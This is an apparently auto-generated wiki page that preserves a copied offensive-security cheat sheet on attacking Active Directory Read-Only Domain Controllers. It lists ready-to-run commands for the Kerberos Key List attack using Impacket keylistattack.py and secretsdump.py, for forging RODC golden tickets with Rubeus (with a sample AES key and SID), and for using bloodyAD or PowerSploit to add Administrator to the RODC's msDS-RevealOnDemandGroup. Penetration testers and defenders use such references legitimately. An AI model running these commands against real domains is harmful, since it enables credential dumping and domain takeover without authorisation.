---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Active Directory - Read Only Domain Controller

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-ad-adds-rodc` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-adds-rodc.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Active Directory - Read Only Domain Controller](../../topics/active-directory/active-directory-read-only-domain-controller.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-ad-adds-rodc |
| name | Active Directory - Read Only Domain Controller |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/ad-adds-rodc.md |

## Preserved Source Material

````yaml
_body: "# Active Directory - Read Only Domain Controller\n\nRODCs are an alternative for Domain Controllers in less secure\
  \ physical locations\n\n- Contains a filtered copy of AD (LAPS and Bitlocker keys are excluded)\n- Any user or group specified\
  \ in the **managedBy** attribute of an RODC has local admin access to the RODC server\n\n## RODC Golden Ticket\n\n- You\
  \ can forge an RODC golden ticket and present it to a writable Domain Controller only for principals listed in the RODC’s\
  \ **msDS-RevealOnDemandGroup** attribute and not in the RODC’s **msDS-NeverRevealGroup** attribute\n\n## RODC Key List Attack\n\
  \n**Requirements**:\n\n- [Impacket PR #1210 - The Kerberos Key List Attack](https://github.com/SecureAuthCorp/impacket/pull/1210)\n\
  - **krbtgt** credentials of the RODC (-rodcKey)\n- **ID of the krbtgt** account of the RODC (-rodcNo)\n\n**Exploit**:\n\n\
  - using Impacket\n\n  ```ps1\n  # keylistattack.py using SAMR user enumeration without filtering (-full flag)\n  keylistattack.py\
  \ DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -full\n\n  # keylistattack.py defining a target\
  \ username (-t flag)\n  keylistattack.py -kdc server.domain.local -t user -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX LIST\n\
  \n  # secretsdump.py using the Kerberos Key List Attack option (-use-keylist)\n  secretsdump.py DOMAIN/user:password@host\
  \ -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -use-keylist\n  ```\n\n- Using Rubeus\n\n  ```ps1\n  Rubeus.exe golden /rodcNumber:25078\
  \ /aes256:eacd894dd0d934e84de35860ce06a4fac591ca63c228ddc1c7a0ebbfa64c7545 /user:admin /id:1136 /domain:lab.local /sid:S-1-5-21-1437000690-1664695696-1586295871\n\
  \  Rubeus.exe asktgs /enctype:aes256 /keyList /service:krbtgt/lab.local /dc:dc1.lab.local /ticket:doIFgzCC[...]wIBBxhYnM=\n\
  \  ```\n\n## RODC Computer Object\n\nWhen you have one the following permissions to the RODC computer object: **GenericWrite**,\
  \ **GenericAll**, **WriteDacl**, **Owns**, **WriteOwner**, **WriteProperty**.\n\n- Add a domain admin account to the RODC's\
  \ **msDS-RevealOnDemandGroup** attribute\n    - Windows/Linux:\n\n    ```ps1\n    # Get original msDS-RevealOnDemandGroup\
  \ values \n    bloodyAD --host 10.10.10.10 -d domain.local -u username -p pass123 get object 'RODC$' --attr msDS-RevealOnDemandGroup\n\
  \    distinguishedName: CN=RODC,CN=Computers,DC=domain,DC=local\n    msDS-RevealOnDemandGroup: CN=Allowed RODC Password\
  \ Replication Group,CN=Users,DC=domain,DC=local\n    # Add the previous value plus the admin account\n    bloodyAD --host\
  \ 10.10.10.10 -d example.lab -u username -p pass123 set object 'RODC$' --attr msDS-RevealOnDemandGroup -v 'CN=Allowed RODC\
  \ Password Replication Group,CN=Users,DC=domain,DC=local' -v 'CN=Administrator,CN=Users,DC=domain,DC=local'\n    ```\n\n\
  \    - Windows only:\n\n  ```ps1\n  PowerSploit> Set-DomainObject -Identity RODC$ -Set @{'msDS-RevealOnDemandGroup'=@('CN=Allowed\
  \ RODC Password Replication Group,CN=Users,DC=domain,DC=local', 'CN=Administrator,CN=Users,DC=domain,DC=local')}\n  ```\n\
  \n## References\n\n- [Attacking Read-Only Domain Controllers (RODCs) to Own Active Directory - Sean Metcalf](https://adsecurity.org/?p=3592)\n\
  - [At the Edge of Tier Zero: The Curious Case of the RODC - Elad Shamir](https://posts.specterops.io/at-the-edge-of-tier-zero-the-curious-case-of-the-rodc-ef5f1799ca06)\n\
  - [The Kerberos Key List Attack: The return of the Read Only Domain Controllers - Leandro Cuozzo](https://www.secureauth.com/blog/the-kerberos-key-list-attack-the-return-of-the-read-only-domain-controllers/)"
_relative_path: active-directory/ad-adds-rodc.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-adds-rodc.md
````
